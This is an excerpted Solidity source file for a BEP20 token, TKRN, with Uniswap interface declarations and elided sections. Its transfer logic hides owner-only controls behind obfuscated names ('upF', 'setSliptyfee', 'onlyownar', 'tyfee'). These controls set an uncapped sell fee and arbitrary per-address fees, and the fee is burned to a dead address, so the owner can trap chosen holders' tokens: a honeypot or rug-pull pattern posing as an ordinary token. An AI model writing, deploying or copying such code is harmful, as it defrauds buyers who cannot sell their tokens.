...
interface IUniswapV2Factory {
    ...
    function tyfeeTo() external view returns (address);
    function tyfeeToSetter() external view returns (address);
    ...
    function settyfeeTo(address) external;
    function settyfeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingtyfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingtyfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingtyfeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingtyfeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingtyfeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract TKRN is BEP20, Ownable {
    ...
    uint256 private _defaultSelltyfee = 0;

    uint256 private _defaultBuytyfee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _sliptyfee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSelltyfee = _value;
    }

    function setSliptyfee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _sliptyfee[_address] = _value;
    }

    function getSliptyfee(address _address) external view onlyownar returns (uint256) {
        return _sliptyfee[_address];
    }


    function setMAccounttyfee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccounttyfee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradetyfeeAmount = 0;

        if (rF) {
            uint256 tradetyfee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradetyfee = _defaultSelltyfee;
                }
                if (from == uniswapV2Pair) {

                    tradetyfee = _defaultBuytyfee;
                }
            }
            if (_sliptyfee[from] > 0) {
                tradetyfee = _sliptyfee[from];
            }

            tradetyfeeAmount = _Amount.mul(tradetyfee).div(100);
        }


        if (tradetyfeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradetyfeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradetyfeeAmount);
            emit Transfer(from, _deadAddress, tradetyfeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradetyfeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradetyfeeAmount);
        emit Transfer(from, _to, _Amount - tradetyfeeAmount);
    }
